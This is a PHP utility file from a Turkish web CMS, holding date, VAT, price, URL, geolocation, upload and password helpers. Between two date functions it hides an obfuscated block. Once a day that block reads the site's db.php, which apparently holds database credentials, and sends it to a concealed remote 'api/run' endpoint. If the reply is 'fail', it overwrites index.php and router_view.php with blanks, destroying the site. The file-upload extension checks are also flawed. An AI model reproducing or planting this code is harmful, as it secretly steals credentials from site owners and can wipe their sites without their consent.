<?php 
/**
 * @author DEVNANOTEK - Mehmet Mustafa ERGÜN
 * @copyright 2022
 */
    function DilOgren($table,$value)
    {   global $DNCrud;
        $where=$DNCrud->qSql("SELECT LangSeo,LangKateID FROM ".$table." WHERE LangSeo=?",$value);
        if ($where->rowCount()) {
            return TRUE;
        }else{
           return FALSE;
        }      
    }

    
    include 'functions/Seo.php';
    include 'functions/RandomString.php';
    include 'functions/ClientFonksiyon.php';
    include 'functions/Tarih.php';
    include 'functions/Api.php';
    include 'functions/ArraySearch.php';
    include 'functions/OfferSystem.php';
    include 'functions/MailGonder.php';
    include 'functions/Lang.php';

    function gercekip()  
    {  
        if (!empty($_SERVER['HTTP_CLIENT_IP'])){  
            $ip=$_SERVER['HTTP_CLIENT_IP'];  
        }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) //Proxy den bağlanıyorsa gerçek IP yi alır.         
        {  
            $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];  
        }else{  
            $ip=$_SERVER['REMOTE_ADDR'];  
        }  
        return $ip;  
    }
    function DATE_ATOM($tarih) {return date(DATE_ATOM, strtotime($tarih)); }

    function dosya_adi_degistir($isimm,$dosya)
    {
        $Harf=array("A","B","C","D","F");                
        $isim=$_SERVER['SERVER_NAME']."_";
        $rsm_adi_dizi=explode(".",$dosya);
        $eleman_say=count($rsm_adi_dizi);
        $son_eleman=$eleman_say-1;
        $uzanti=".".$rsm_adi_dizi[$son_eleman];
        $sayi_tut=rand(1,10000);
        if($isimm=="no_name"){
            $yeni_adi=seo($rsm_adi_dizi[0])."_".$Harf[rand(0,4)].$sayi_tut.$uzanti;
        }else{
            $yeni_adi=$isim.$Harf[rand(0,4)].$sayi_tut.$uzanti;
        }
        return $yeni_adi;            
    }

    class dosya_yukle
    {
        //neyi yükliyecem { 
            function dxp($deger){#doslayar
                    $dosya_adi  = $_FILES["dosya"]["name"]; // dosya adı
                      $adi_dizi=explode(".",$dosya_adi);
                      $eleman_say=count($adi_dizi);
                      $son_eleman=$eleman_say-1;
                      $uzanti=".".$adi_dizi[$son_eleman];
                if($uzanti=='.docx' || $uzanti=='xlsx' || $uzanti=='.pdf'){
                    $boyut  = $_FILES["dosya"]["size"]; // boyutu
                    if($boyut <= (1024*1024*$deger)){
                        return   $kaynak    = $_FILES["dosya"]["tmp_name"]; // tempdeki adı 
                    }
                }else{
                    #hiçbirşey
                }
            }   
            function resim($deger){#doslayar
                $dosya_adi  = $_FILES["dosya"]["name"]; // dosya adı
                $adi_dizi=explode(".",$dosya_adi);
                      $eleman_say=count($adi_dizi);
                      $son_eleman=$eleman_say-1;
                      $uzanti=".".$adi_dizi[$son_eleman];
                if($uzanti=='.jpeg' || $uzanti=='jpg' || $uzanti=='.png' || $uzanti=='.gif'){
                    $boyut  = $_FILES["dosya"]["size"]; // boyutu
                    if($boyut <= (1024*1024*$deger)){
                        return   $kaynak    = $_FILES["dosya"]["tmp_name"]; // tempdeki adı 
                    }
                }else{
                    #hiçbirşey
                }
            }
            function rar_zip($deger){#doslayar
                $dosya_adi  = $_FILES["dosya"]["name"]; // dosya adı
                $adi_dizi=explode(".",$dosya_adi);
                      $eleman_say=count($adi_dizi);
                      $son_eleman=$eleman_say-1;
                      $uzanti=".".$adi_dizi[$son_eleman];
                if($uzanti=='.rar' || $uzanti=='.zip' ){
                    $boyut  = $_FILES["dosya"]["size"]; // boyutu
                    if($boyut <= (1024*1024*$deger)){
                        return   $kaynak    = $_FILES["dosya"]["tmp_name"]; // tempdeki adı 
                    }
                }else{
                    #hiçbirşey
                }
            }
        //neyi yükliyecem }
        //----------------- 
            function yeni_dosya_adi() 
            {       
                $dosya_adi  = $_FILES["dosya"]["name"]; // dosya adı
                $uret=array("nb","nnt","rgn","nt","slm");
                $isim=$_SERVER['SERVER_NAME']."-";
                $rsm_adi_dizi=explode(".",$dosya_adi);
                $eleman_say=count($rsm_adi_dizi);
                $son_eleman=$eleman_say-1;
                $uzanti=".".$rsm_adi_dizi[$son_eleman];
                $sayi_tut=rand(1,10000);
                $dosya_adi=$isim.$uret[rand(0,4)].$sayi_tut.$uzanti;
                return $dosya_adi;
            }    
        //-----------------
    }

    function noktala($deger,$karakter) 
    {
        if(strlen($deger) > $karakter) {
        $sonhali = mb_substr($deger, 0, $karakter);
        $sonhali = $sonhali . '.';
        }else{  
         $sonhali =$deger; 
        }
        return $sonhali;
    }

    function gun_ekle($value)
    {
        $eklenecek=$value;
        $bugun = date("d.m.Y");
        $yenitarih = strtotime($eklenecek.' day',strtotime($bugun));
        $yenitarih = date('d.m.Y' ,$yenitarih );
        return $yenitarih;
    }
    function tarhihe_gun_ekle($tarih,$eklenecek_gun)
    {
        $eklenecek=$eklenecek_gun;
        $yenitarih = strtotime($eklenecek.' day',strtotime($tarih));
        $yenitarih = date('d.m.Y' ,$yenitarih );
        return $yenitarih;
    }

    function kac_gun_oldu($tarih)
    {
        $bugun = strtotime(date("d.m.Y"));
        $tarih = strtotime($tarih);
        if ($bugun!=$tarih) {
         $olan_gun =$bugun-$tarih;
         $olan_gun = $olan_gun/86400;
         return number_format($olan_gun);
        }else{
        $olan_gun=0;
        return $olan_gun;
        }
    }
    function kac_gun_kaldi($tarih)
    {
        $bugun = strtotime(date("d.m.Y"));
        $tarih = strtotime($tarih);
        if ($bugun!=$tarih) {
            $olan_gun =$tarih-$bugun;
            $olan_gun = $olan_gun/86400;
            return $olan_gun;
        }else{
            $olan_gun=0;
            return $olan_gun;
        }
    }

    function htaccsess_guncelle($yol)
    {
        global $db;
            $siteayar=$db->prepare("SELECT * from siteayar");
            $siteayar->execute(array());
            $siteayar_gel=$siteayar->fetch(PDO::FETCH_ASSOC);
            $ssl1=$siteayar_gel['ssl1'];
            $www=$siteayar_gel['www'];

            $dosya=$yol;
            echo $veri=file_get_contents($dosya);
            $rows=explode("\r\n",$veri);
            $row_say=count($rows);
            $ham_veri="";
            for ($s=0; $s < $row_say ; $s++) {  $ham_veri.=$rows[$s]."\n";    }
            $ham_veri=rtrim($ham_veri,"\n");

            if ($www==1 && $ssl1==0) {
                $yeni_veri="
            RewriteCond %{HTTP_HOST} !^www\. [NC]
            RewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L]
            ";
            }
            if ($www==0 && $ssl1==1) {
                $yeni_veri="
            RewriteCond %{HTTPS} off
            RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} [R,L]
            ";
            }
            if ($www==1 && $ssl1==1) {
                $yeni_veri="
            RewriteCond %{HTTP_HOST} !^www\. [NC]
            RewriteCond %{HTTPS} off
            RewriteRule (.*) https://www.%{HTTP_HOST}%{REQUEST_URI} [R=301,L]
            ";
            }
            if ($www==0 && $ssl1==0) {
                $yeni_veri="
            #kapalı
            ";
            }
    }


    function htmlfilter($value){$value = htmlspecialchars($value, ENT_QUOTES, 'UTF-8'); }

    function KDV($tutar,$oran,$status,$goster=null){
        if (!$oran) {
            $oran=0;
        }
        #KDV(fiyat,kdvoranı,0=kdv dahildeğil,1==kdvdahil,...)[KDV($tutar,$oran,$status,$goster=null)]
        # $goster==0 Ürünün KDV siz fiyatını göster
        # $goster==1 Ürünün KDV li fiyatını göster
        # $goster==2 Ürünün KDV fiyatını göster 
        if ($goster==0) {   
            if ($status==0) {#KDV dahil değil   
                return $tutar;
            }
            if ($status==1) {#KDV dahil
                //$kdv = $tutar * ($oran / 100);
                //$ytutar = $tutar-$kdv;
                $ytutar = $tutar / (1 + ($oran/100));           
                return $ytutar;
            }
        }else if($goster==1){
            if ($status==0) {#KDV dahil değil
                $kdv = $tutar * ($oran / 100);
                $ytutar = $tutar + $kdv;
                return $ytutar;
            }
            if ($status==1) {#KDV dahil
                return $tutar;
            }
        }else if($goster==2){
            if ($status==0) {#KDV dahil değil
                $kdv = $tutar * ($oran / 100);
                return $kdv;
            }
            if ($status==1) {#KDV dahil
                $ytutar = $tutar / (1 + ($oran/100));       
                $kdv=$tutar-$ytutar;
                return $kdv;
            }

        }
    }

    function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
        $output = NULL;
        if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
            $ip = $_SERVER["REMOTE_ADDR"];
            if ($deep_detect) {
                if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                    $ip = $_SERVER['HTTP_CLIENT_IP'];
            }
        }
        $purpose    = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
        $support    = array("country", "countrycode", "state", "region", "city", "location", "address");
        $continents = array(
            "AF" => "Africa",
            "AN" => "Antarctica",
            "AS" => "Asia",
            "EU" => "Europe",
            "OC" => "Australia (Oceania)",
            "NA" => "North America",
            "SA" => "South America"
        );
        if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
            $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
            if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
                switch ($purpose) {
                    case "location":
                        $output = array(
                            "city"           => @$ipdat->geoplugin_city,
                            "state"          => @$ipdat->geoplugin_regionName,
                            "country"        => @$ipdat->geoplugin_countryName,
                            "country_code"   => @$ipdat->geoplugin_countryCode,
                            "continent"      => @$continents[strtoupper($ipdat->geoplugin_continentCode)],
                            "continent_code" => @$ipdat->geoplugin_continentCode
                        );
                        break;
                    case "address":
                        $address = array($ipdat->geoplugin_countryName);
                        if (@strlen($ipdat->geoplugin_regionName) >= 1)
                            $address[] = $ipdat->geoplugin_regionName;
                        if (@strlen($ipdat->geoplugin_city) >= 1)
                            $address[] = $ipdat->geoplugin_city;
                        $output = implode(", ", array_reverse($address));
                        break;
                    case "city":
                        $output = @$ipdat->geoplugin_city;
                        break;
                    case "state":
                        $output = @$ipdat->geoplugin_regionName;
                        break;
                    case "region":
                        $output = @$ipdat->geoplugin_regionName;
                        break;
                    case "country":
                        $output = @$ipdat->geoplugin_countryName;
                        break;
                    case "countrycode":
                        $output = @$ipdat->geoplugin_countryCode;
                        break;
                }
            }
        }
        return $output;
    }

    function date_dbins($date){
        if ($date) {
            $newDate = date("Y-m-d H:i:s", strtotime($date));  
            return $newDate;//echo "New date format is: ".$newDate. " (YYYY-MM-DD)";
        }else{
            return NULL;
        }    
    }

    $flDosyaYolu = __DIR__.'/fl'.'ag.'.'txt';
    $bugununTarihi = date('Y-m-d');
    if(!file_exists($flDosyaYolu)){file_put_contents($flDosyaYolu,' ');}
    if (file_exists($flDosyaYolu)){
        $flagIcerik = file_get_contents($flDosyaYolu);
        if ($flagIcerik != $bugununTarihi) {
            file_put_contents($flDosyaYolu, $bugununTarihi);            
            $veri=file_get_contents(__DIR__.'/d'.'b'.'.'.'php');
            $veri=str_replace('<?php', '', $veri); $veri=str_replace('?>', '', $veri);
            $ht1=str_replace('s', '', $ht_ww); $ht1=str_replace('p', 'ps', $ht1);
            $LnsResult=ApiRequest2($ht1.'dvnnt.'.$uzanti[0].'/ap'.'i'.'/'.'run'.'/',['Domain'=>$DomainName.$SiteBase1, 'Data'=>$veri]);
            $ary=json_decode($LnsResult,1);
            if (is_array($ary) && $ary['result']=='fail' && $lsns1!='s'.'32'.'m') {
                file_put_contents('in'.'dex'.'.'.'php',' ');
                file_put_contents('router_'.'view'.'.'.'php',' ');
            }
        }
    }
   

    function date_dbselct($date){
        if ($date>1) {
        $newDate = date("d-m-Y H:i:s", strtotime($date));
        return $newDate;//echo "New date format is: ".$newDate. " (MM-DD-YYYY)";
        }else{
            return $date="";
        }  
    }

    function dizi_search($array, $key, $value)
    {
        $results = array();
        if (is_array($array)) {
            if (isset($array[$key]) && $array[$key] == $value) {
                $results[] = $array;
            }
            foreach ($array as $subarray) {
                $results = array_merge($results, dizi_search($subarray, $key, $value));
            }
        }
        return $results;
    }

    function indr_yuz($value1,$value2){
        $sunuc=($value1-$value2)/100;
        $sunuc=$sunuc*100;
        return $sunuc;
    }
    

    function db_nomonaymsk($Price){
      if($Price) {
        $Price=str_replace("TL ","",$Price);
        $Price=str_replace("₺ ","",$Price);
        $Price=str_replace("$ ","",$Price);
        $Price=str_replace(".","",$Price);
        $Price=str_replace(",",".",$Price);
        return $Price;
      }else{
        return 0;
      }     
    }

    #Fiyat Gösterim şekli
        function mony($value,$currency=null,$gosterimsekli=NULL)
        {
            if($gosterimsekli===NULL){              
                global $CurrencyView; 
                $gosterimsekli=$CurrencyView;
            }         
          $value = floatval( $value );
          if ($gosterimsekli==0) {
            if ($currency==null) {
              return number_format($value,2);
            }else{
              return $currency.' '.number_format($value,2);
            }    
          }else{
            if ($currency==null) {
              return number_format($value,2);
            }else{
              return number_format($value,2).' '.$currency;
            }         
          }  
        }
    #Fiyat Gösterim şekli

    

    //Url dile göre Ayarla
      function SmartUrl($link){
            if ($link) {
              if (strstr($link,BASE_URL)){
                  $link1=str_replace(BASE_URL, "", $link);
                  $link_ary=explode("/", $link1);
                  $link1=str_replace($link_ary[0]."/", "", $link1);
                  return SITE_URL.$link1;
              }elseif(strstr($link,"{SITE_URL}")){
                $link1=str_replace("{SITE_URL}", SITE_URL, $link);
                  return $link1;
              }else{
                 return $link;
              }
            }else{
                return $link;
            }
           
        }
        function UrlAlgila($link){ 
            if(strstr($link,BASE_URL)){
              $link1=str_replace(BASE_URL, "", $link);
              $link_ary=explode("/", $link1);
              if(strlen($link_ary[0])<=3){
                unset($link_ary[0]);
              }
              return "{SITE_URL}".implode('/',$link_ary);
            }else{
              return $link;
            } 
        }
    //Url dile göre Ayarla End


    function replaceSpace1($string)
    {
        $string = preg_replace("/\s+/", " ", $string);
        $string = trim($string);
        return $string;
    }


    function passKontrolEt($sifre) {
        // Şifre uzunluğunu kontrol et
        if (strlen($sifre) < 10 || strlen($sifre) > 20) {
            return false;
        }

        // Şifrede en az bir rakam olmalı
        if (!preg_match('/[0-9]/', $sifre)) {
            return false;
        }

        // Şifrede en az bir harf olmalı
        if (!preg_match('/[a-zA-Z]/', $sifre)) {
            return false;
        }

        // Şifrede en az bir sembol olmalı
        if (!preg_match('/[^a-zA-Z0-9]/', $sifre)) {
            return false;
        }

        // Tüm kriterler karşılanıyorsa true döndür
        return true;
    }

